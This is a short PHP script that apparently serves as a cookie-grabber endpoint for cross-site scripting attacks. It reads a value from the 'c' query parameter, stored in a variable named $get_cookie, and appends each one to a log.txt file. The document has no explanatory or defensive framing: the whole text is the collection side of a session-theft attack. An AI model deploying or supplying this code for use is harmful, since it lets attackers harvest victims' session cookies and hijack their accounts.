<?php
  $get_cookie = $_GET["c"];
  $file = fopen('log.txt', 'a');
  fwrite($file, $get_cookie . "\n\n");
?>
